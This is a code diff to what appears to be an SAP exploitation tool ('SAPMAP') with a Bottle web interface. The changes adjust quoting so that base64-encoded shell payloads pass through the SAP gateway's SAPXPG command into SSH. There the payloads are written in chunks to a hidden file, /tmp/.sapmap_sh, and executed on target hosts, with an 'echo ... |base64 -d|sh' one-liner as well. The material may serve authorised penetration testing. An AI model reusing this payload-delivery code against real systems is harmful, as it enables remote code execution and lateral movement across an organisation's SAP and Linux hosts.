@@ -7162,7 +7162,7 @@ def create_app(api: SAPMAPApi) -> Bottle:
                 f"-o LogLevel=ERROR "
                 f"-i {acc['key_path']} "
                 f"{acc['username']}@{acc['target']} "
-                f"echo {b64cmd}|base64 -d|sh"
+                f"'echo {b64cmd}|base64 -d|sh'"
             )
             print(f"[*] {sid}: OS terminal via SSH from "
                   f"{acc['from_sid']} → {acc['username']}@"
@@ -7550,7 +7550,10 @@ def create_app(api: SAPMAPApi) -> Bottle:
                     f"{acc['username']}@{acc['target']}")
 
                 # Calculate chunk size: 255 - len(prefix) - wrapper
-                # wrapper = ' "echo |base64 -d>>/tmp/.sapmap_sh"' = ~40
+                # Use single quotes (SAPXPG respects them for
+                # grouping, but NOT double quotes — double quotes
+                # pass through literally to SSH argv and break).
+                # wrapper = " 'echo |base64 -d>>/tmp/.sapmap_sh'" ~42
                 avail = 255 - len(ssh_prefix) - 42
                 if avail < 20:
                     avail = 40  # fallback
@@ -7561,7 +7564,7 @@ def create_app(api: SAPMAPApi) -> Bottle:
                 _set_progress("Preparing SSH payload delivery...")
                 sapmap_exploit.execute_gw_command(
                     src_node, "ssh",
-                    f'{ssh_prefix} "rm -f /tmp/.sapmap_sh"',
+                    f"{ssh_prefix} 'rm -f /tmp/.sapmap_sh'",
                     long_params="")
 
                 # Write chunks
@@ -7574,16 +7577,16 @@ def create_app(api: SAPMAPApi) -> Bottle:
                         f"Writing payload chunk {idx+1}/{total} "
                         f"via SSH...")
                     ssh_args = (
-                        f'{ssh_prefix} '
-                        f'"echo {chunk}|base64 -d>>/tmp/.sapmap_sh"')
+                        f"{ssh_prefix} "
+                        f"'echo {chunk}|base64 -d>>/tmp/.sapmap_sh'")
                     sapmap_exploit.execute_gw_command(
                         src_node, "ssh", ssh_args, long_params="")
 
                 # Execute
                 _set_progress("Executing shell payload via SSH...")
                 ssh_args = (
-                    f'{ssh_prefix} '
-                    f'"chmod +x /tmp/.sapmap_sh;sh /tmp/.sapmap_sh"')
+                    f"{ssh_prefix} "
+                    f"'sh /tmp/.sapmap_sh'")
                 result = sapmap_exploit.execute_gw_command(
                     src_node, "ssh", ssh_args, long_params="")
                 result["success"] = True  # SSH fire-and-forget
